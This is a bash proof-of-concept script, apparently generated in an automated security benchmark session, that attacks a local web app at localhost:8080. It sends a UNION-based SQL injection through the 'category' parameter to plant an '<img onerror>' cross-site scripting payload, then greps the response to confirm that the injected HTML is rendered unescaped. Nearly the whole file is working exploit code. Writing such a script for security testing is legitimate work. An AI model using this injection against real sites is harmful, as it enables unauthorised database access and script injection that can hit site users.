#!/bin/bash
# POC: Demonstrates Stored XSS via SQL Injection - uses UNION-based SQL injection to inject malicious HTML/JavaScript that is rendered without escaping
# Target: ./repo
# Created: 2025-11-07T21:49:21.761Z
# Session: benchmark-XBEN-078-24-mhpdbdxp

# Stored XSS via SQL Injection POC
# This script demonstrates how SQL injection can be used to inject XSS payloads
# The vulnerability chain: SQL Injection -> Unsafe Output Rendering -> Stored XSS

TARGET="http://localhost:8080"
PAYLOAD="Nature' AND 1=2 UNION SELECT 1,'<img src=x onerror=alert(1)>',3,4,5,6,7 FROM posts WHERE 1='1"

echo "======================================"
echo "Stored XSS via SQL Injection POC"
echo "======================================"
echo ""
echo "Target: $TARGET"
echo "Attack Vector: SQL Injection with XSS payload in category parameter"
echo ""
echo "Payload: $PAYLOAD"
echo ""

# Make the request
echo "[*] Sending malicious request..."
RESPONSE=$(curl -s "$TARGET/?category=$(echo "$PAYLOAD" | jq -sRr @uri)")

echo "[*] Analyzing response..."
echo ""

# Check if the response contains the injected XSS payload
if echo "$RESPONSE" | grep -q '<img src=x onerror=alert(1)>'; then
    echo "[+] SUCCESS: Injected XSS payload found in response!"
    echo ""
    
    # Check if it appears in multiple contexts
    if echo "$RESPONSE" | grep -q '<h2><img src=x onerror=alert(1)></h2>'; then
        echo "[+] XSS payload found in <h2> tag (title context)"
    fi
    
    if echo "$RESPONSE" | grep -q "alt='<img src=x onerror=alert(1)>'"; then
        echo "[+] XSS payload found in alt attribute (attribute context)"
    fi
    
    # Show the vulnerable sections
    echo ""
    echo "[*] Vulnerable HTML sections:"
    echo "---"
    echo "$RESPONSE" | grep -A2 -B2 '<img src=x onerror=alert(1)>' | head -20
    echo "---"
    echo ""
    echo "[+] Vulnerability Confirmed: The injected HTML/JavaScript is rendered without escaping!"
    exit 0
else
    echo "[-] XSS payload not found in response"
    echo ""
    echo "[*] Response snippet:"
    echo "$RESPONSE" | head -50
    exit 1
fi